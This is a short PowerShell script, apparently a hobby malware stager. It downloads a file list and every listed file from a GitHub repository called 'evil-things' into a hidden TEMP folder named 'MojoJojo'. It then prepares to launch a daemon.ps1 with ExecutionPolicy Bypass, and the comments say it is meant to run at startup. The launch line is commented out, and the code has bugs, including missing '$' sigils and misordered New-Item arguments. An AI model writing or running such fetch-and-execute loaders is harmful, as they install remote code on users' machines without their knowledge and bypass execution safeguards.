# Description: This script will download all the files from the repository and store them in a local folder for futher use.
# It will also download a list of files that will be downloaded. This list is used to skip downloading files that are not needed.
# This script is meant to be run at startup and will download all the files that are needed for the other scripts to run.
# The files.txt file is used to determine which files to download. The format of the file is:
# <file name>;<true/false>
# If the second value is true, the file will be downloaded. If it is false, the file will not be downloaded.
$folderName = "MojoJojo"
$localFolder = $env:TEMP + "\" + $folderName

if (!(Test-Path -Path $localFolder))
{
    New-Item -ItemType Directory -Path -Force $localFolder | Out-Null
}

$serverRoot = "https://raw.githubusercontent.com/Jakolcz/evil-things/main/"
$filesList = $serverRoot + "files.txt"
$localFilesList = $localFolder + "\files.txt"

Invoke-WebRequest -Uri $filesList -OutFile $localFilesList

foreach ($line in [System.IO.File]::ReadLines($localFilesList))
{
    $lineValues = $line.Split(";")
    $file = lineValues[0]
    $download = lineValues[1]
    if ($download -eq "false")
    {
        continue
    }
    $url = $serverRoot + $file
    $localFile = $localFolder + "\" + $file
    Invoke-WebRequest -Uri $url -OutFile $localFile
}

if (Test-Path -Path $localFolder + "\powershell\daemon.ps1")
{

#    powershell -ExecutionPolicy Bypass -File $localFolder + "\powershell\daemon.ps1"
}